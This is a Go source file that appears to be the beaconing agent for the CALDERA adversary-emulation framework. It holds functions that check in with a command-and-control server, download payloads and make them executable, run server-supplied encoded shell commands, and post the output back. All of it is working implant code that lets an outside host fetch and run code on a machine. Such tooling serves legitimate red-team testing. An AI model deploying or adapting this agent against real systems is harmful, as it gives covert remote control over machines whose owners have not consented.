package api

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"io"
	"runtime"
	"io/ioutil"
	"time"
	"encoding/json"
	"path/filepath"
	"../util"
	"../execute"
)

// Instructions is a single call to the C2
func Instructions(server string, group string, paw string) interface{} {
	data, _ := json.Marshal(map[string]string{"platform": runtime.GOOS, "group": group})
	address := fmt.Sprintf("%s/sand/instructions", server)
	bites := request(address, paw, data)
	if bites != nil {
		fmt.Println("[+] beacon: ALIVE")
	} else {
		fmt.Println("[-] beacon: DEAD")
	}
	var out interface{}
	json.Unmarshal(bites, &out)
	return out
}

// Drop the payload from CALDERA
func Drop(server string, payload string) {
	location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", string(runtime.GOOS))
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil {
			dst, _ := os.Create(location) 
			defer dst.Close()
			_, _ = io.Copy(dst, resp.Body)
			os.Chmod(location, 0500)
		}
	}
}

// Execute executes a command and posts results to CALDERA
func Execute(server string, paw string, command map[string]interface{}) {
	cmd := string(util.Decode(command["command"].(string)))
	status := "0"
	result, err := execute.Execute(cmd)
	if err != nil {
		status = "1"
	}
	address := fmt.Sprintf("%s/sand/results", server)
	link := fmt.Sprintf("%f", command["id"].(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
	request(address, paw, data)
	time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
}

func request(address string, paw string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	req.Header.Set("X-PAW", paw)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}
